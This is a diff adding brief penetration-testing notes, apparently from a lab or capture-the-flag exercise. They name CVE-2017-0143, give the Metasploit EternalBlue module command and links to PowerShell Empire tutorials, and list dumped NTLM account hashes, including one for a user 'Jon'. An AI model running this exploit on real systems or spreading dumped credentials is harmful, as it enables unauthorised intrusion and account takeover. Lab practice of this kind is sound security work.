@@ -1,0 +1,14 @@
+Vuln - CVE-2017-0143
+
+https://www.embeddedhacker.com/2019/08/hacking-tutorial-rp-ps-empire/
+
+use windows/smb/ms17_010_eternalblue
+
+https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
+
+
+hashes - lol
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
